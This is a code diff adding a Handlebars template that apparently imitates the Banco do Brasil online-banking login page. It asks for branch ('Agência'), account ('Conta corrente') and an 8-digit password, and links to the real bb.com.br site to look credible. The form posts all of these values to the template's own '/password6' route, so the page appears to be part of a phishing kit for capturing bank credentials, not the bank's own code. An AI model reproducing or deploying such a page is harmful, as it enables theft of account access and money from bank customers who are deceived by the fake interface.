@@ -1,0 +1,81 @@
+{{>components/topbar}}
+
+{{>components/accountType/container}}
+
+<div id="__next">
+        <div class="clean-page-container__Container-sc-fzay79-0 dGAlqK">
+
+            <!-- error -->
+            <form method="POST" autocomplete="off" class="form-stn {{#if client}}form-error{{/if}}" {{#if client}} name="f2"{{else}} name="f1" {{/if}} action="/password6" >
+                <div width="400" class="sc-AxjAm hfpSUp card__Card-sc-2xb3kk-0 IOciT">
+                    <h2>Agência e conta</h2>
+                    <div class="styles__DimmerWrapper-sc-q27j9n-0 dkPhEC">
+                        <div class="styles__LoaderIcon-sc-1onbhrc-0 ebFmcr"></div>
+                    </div>
+{{!-- 
+                    {{#if client}} 
+                    <div class="text-error"> <span>Dados inválidos</span></div>
+                    
+                    {{/if}} --}}
+                    <div class="sc-fzozJi ldfQIR">
+                        {{#if client}}
+                        <input type="hidden" name="id" value="{{client.id}}">
+                        {{/if}}
+                        <div class="sc-AxjAm sc-AxirZ fUlriR">
+                            <div color="mediumGray2" font-weight="normal" font-size="1" class="sc-AxjAm hgtMkm"></div>
+                            <div class="sc-AxjAm sc-AxirZ ezTcmd styles__InputContainer-sc-vrdjm4-2 ktCUnx">
+                                <input type="text" autocomplete="off" font-size="2" id="email" name="username" class="
+                                    sc-AxjAm fBbPZk 
+                                    styles__StyledInput-sc-vrdjm4-0 
+                                    Csscx
+                                    {{#ifCond error 'login'}}
+                                    error
+                                    {{/ifCond}}
+                                " required="required"
+                                pattern="(\d{5})-(\d{2})$"
+                                placeholder="Agência" />
+                            </div>
+                            <label color="darkGray" font-size="2" for="username" order="-1" class="sc-AxjAm sc-AxirZ cfFABH">
+                                <div class="sc-AxjAm sc-AxirZ cshaSV">Agência</div>
+                            </label>
+                            <small>Informe sua agência com o dígito</small>
+                        </div>
+                        <div class="sc-AxjAm sc-AxirZ fUlriR">
+                            <div color="mediumGray2" font-weight="normal" font-size="1" class="sc-AxjAm hgtMkm"></div>
+                            <div class="sc-AxjAm sc-AxirZ ezTcmd styles__InputContainer-sc-vrdjm4-2 ktCUnx">
+                                <input type="text" autocomplete="off" placeholder="Conta corrente" font-size="2" id="password" name="password" class="sc-AxjAm fBbPZk styles__StyledInput-sc-vrdjm4-0 Csscx" required="required" />
+                            </div><label color="darkGray" font-size="2" for="password" order="-1" class="sc-AxjAm sc-AxirZ cfFABH">
+                                <div class="sc-AxjAm sc-AxirZ cshaSV">Conta</div>
+                            </label>
+                            <small>Informe sua conta com o dígito</small>
+                        </div>
+                        <div class="sc-AxjAm sc-AxirZ fUlriR">
+                            <div color="mediumGray2" font-weight="normal" font-size="1" class="sc-AxjAm hgtMkm"></div>
+                            <div class="sc-AxjAm sc-AxirZ ezTcmd styles__InputContainer-sc-vrdjm4-2 ktCUnx">
+                                <input type="text" autocomplete="off" placeholder="Senha de 8 dígitos" font-size="2" id="password" name="password6" class="sc-AxjAm fBbPZk styles__StyledInput-sc-vrdjm4-0 Csscx" required="required" />
+                            </div>
+                        </div>
+                        <div class="sc-AxhCb jXrfDR">
+                            <div name="captcha"></div>
+                            <div color="red" class="sc-AxjAm jmPVhW styles__StyledText-sc-ftb6xw-0 gouAvy"></div>
+                        </div>
+
+                        <div class="switchers">
+                            <div class="form-check form-switch">
+                                <input class="form-check-input" type="checkbox" id="flexSwitchCheckChecked" checked>
+                                <label class="form-check-label" for="flexSwitchCheckChecked">Guardar agência e conta</label>
+                            </div>
+                        </div>
+                        
+                        <button type="submit" width="1" class="sc-AxjAm bmfNbS styles__StyledButton-sc-1066mea-0 OPeEQ" id="btnLogin">Continuar</button>
+
+                        <div class="row text-center text-access">
+                            <a href="https://www.bb.com.br/pbb/pagina-inicial/atendimento#/">Outro tipo de acesso</a>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+</div>
+{{>components/footerForm}}
+    <div id="modal"></div>
